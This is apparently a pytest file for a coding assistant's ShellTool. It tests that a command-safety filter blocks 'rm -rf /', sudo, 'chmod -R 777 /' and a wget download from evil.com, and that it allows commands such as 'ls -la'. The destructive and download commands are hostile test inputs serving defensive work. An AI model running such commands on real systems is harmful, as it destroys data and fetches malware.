import asyncio
from pathlib import Path

from coding_assistant.tools.code_executor import ShellTool


class TestShellToolSafety:
    def test_blocks_rm_rf(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        safe, reason = shell._is_command_safe("rm -rf /")
        assert not safe
        assert "Blocked" in reason

    def test_blocks_sudo(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        safe, reason = shell._is_command_safe("sudo apt install something")
        assert not safe

    def test_allows_safe_commands(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        safe, _ = shell._is_command_safe("python -m pytest tests/")
        assert safe

    def test_allows_ls(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        safe, _ = shell._is_command_safe("ls -la")
        assert safe

    def test_blocks_wget(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        safe, _ = shell._is_command_safe("wget http://evil.com/malware")
        assert not safe

    def test_blocks_chmod_777(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        safe, _ = shell._is_command_safe("chmod -R 777 /")
        assert not safe


class TestShellToolExecute:
    def test_execute_echo(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        result = asyncio.run(shell.execute("echo hello"))
        assert result.success
        assert "hello" in result.output

    def test_execute_failing_command(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        result = asyncio.run(shell.execute("false"))
        assert not result.success

    def test_execute_blocked_command(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        result = asyncio.run(shell.execute("rm -rf /"))
        assert not result.success
        assert result.metadata.get("recoverable") is False

    def test_get_tool_schemas(self, tmp_path: Path):
        shell = ShellTool(tmp_path)
        schemas = shell.get_tool_schemas()
        assert len(schemas) == 1
        assert schemas[0]["function"]["name"] == "run_shell"
